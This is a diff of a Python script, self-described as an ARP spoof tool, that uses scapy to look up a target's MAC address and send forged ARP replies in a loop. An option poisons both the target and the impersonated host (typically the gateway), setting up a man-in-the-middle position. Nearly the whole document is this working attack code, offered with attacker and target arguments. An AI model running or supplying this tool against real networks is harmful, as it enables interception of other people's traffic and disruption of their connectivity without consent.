@@ -4,59 +4,65 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 from argparse import ArgumentParser
+from scapy.all import *
 
-def printInterfaces():
-    for iface in ifaces.keys():
-        print(iface)
+def db():
+    import pdb
+    pdb.set_trace()
 
-def getGatewayMac():
-    pass
-    
-def getGatewayIP():
-    pass
-    
-def getIfaceMAC():
-    pass
+# side affect of function: ip_addrs will think src_ipaddrs has iface's mac address
+def getMacOfIP(ip_addrs, iface, src_ipaddrs=None):
+    srcMAC = getHwAddr(iface)
+    mac_request_pkt = Ether(src=srcMAC, dst='ff:ff:ff:ff:ff:ff') / ARP(op='who-has', hwsrc=srcMAC, psrc=src_ipaddrs, pdst=ip_addrs)
+    response = srp1(mac_request_pkt, iface=iface, timeout=2, verbose=0)
+    if response == None:
+        print("error getting MAC address of ip: " + ip_addrs + ", quitting")
+        exit(1)
+    return response[Ether].src
+ 
+# https://stackoverflow.com/a/4789267
+def getHwAddr(ifname):
+    import fcntl, socket, struct
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
+    return ':'.join(['%02x' % ord(char) for char in info[18:24]])
         
 def main():
-    parser = ArgumentParser(description="just another ARP spoof tool")
-    parser.add_argument('-p', '--impersonateIP', default=getGatewayIP(), help='IP to impersonate')
-    parser.add_argument('-i', dest='interface', help='specify interface to MAC spoof on')
-    parser.add_argument('-s', dest='sourceMAC', default=getIfaceMAC(), help='source MAC of attacker (default = interfaceMAC)')
-    parser.add_argument('-d', dest='delay', type=float, default=1.0, help='delay in seconds between packets broadcasted (default = 2 seconds)')
-    parser.add_argument('--gw',dest='spoof_gw', action='store_true', default=False, help='spoof local gateway as well (default = false)')
+    parser = ArgumentParser(description="just another ARP spoof tool") 
+    parser.add_argument('-s', dest='sourceMAC', default=getHwAddr('eth0'), help='source MAC of attacker (default = eth0 MAC)')
+    parser.add_argument('-d', dest='delay', type=float, default=1.0, help='delay in seconds between packet broadcasts (default = 1 second)')
+    parser.add_argument('--full-duplex',dest='full_duplex', action='store_true', default=False, help='spoof in both directions (default = false, only targetIP)')
+    parser.add_argument('impersonateIP', help='IP to impersonate (example: local gateway)')
     parser.add_argument('targetIP', help='IP of target to attack')
     
     parsed_args = parser.parse_args()
     
     targetIP        = parsed_args.targetIP
-    interface       = parsed_args.interface
     impersonateIP   = parsed_args.impersonateIP
     sourceMAC       = parsed_args.sourceMAC
     delay           = parsed_args.delay
-    spoof_gw        = parsed_args.spoof_gw
+    full_duplex     = parsed_args.full_duplex
+    iface = 'eth0'
     
-    for manadatory_option in (targetIP, interface):
-        if manadatory_option == None:
-            print(parser.usage)
-            print("available iterfaces:")
-            printInterfaces()
-            exit(0)
-    
-    from scapy.all import sendp, ifaces, Ether, ARP
-    
-    target_arp_spoof_pkt = Ether() / ARP(op='is_at', hwsrc=sourceMAC, psrc=impersonateIP, pdst=targetIP)
+    targetMAC = getMacOfIP(targetIP, iface, impersonateIP)
+
+
+    target_arp_spoof_pkt = Ether(dst=targetMAC) / ARP(op='is-at', hwsrc=sourceMAC, hwdst=targetMAC, psrc=impersonateIP, pdst=targetIP)
     spoof_pkts = [target_arp_spoof_pkt]
     
-    if spoof_gw == True:
-        gw_arp_spoof_pkt = Ether() / ARP(op='is_at', hwsrc=sourceMAC, psrc=targetIP, pdst=getGatewayIP())
+    if full_duplex == True:
+        otherEndMAC = getMacOfIP(impersonateIP, iface)
+
+        gw_arp_spoof_pkt = Ether(dst=otherEndMAC) / ARP(op='is-at', hwsrc=sourceMAC, hwdst=otherEndMAC, psrc=targetIP, pdst=impersonateIP)
         spoof_pkts.append(gw_arp_spoof_pkt)
         # divide by 2 to accommodate sending a packet to target and a separate packet to gateway
-        delay /= 2
+        delay /= 2.0
     
     try:
-        sendp(spoof_pkts, inter=delay, loop=True)
-    except (KeyboardInterrupt, SystemExit):
+        sendp(spoof_pkts, iface='eth0', inter=delay, loop=True)
+
+    # keyboard interrupt raised by Cntrl-c
+    except KeyboardInterrupt:
         exit(0)
     
    
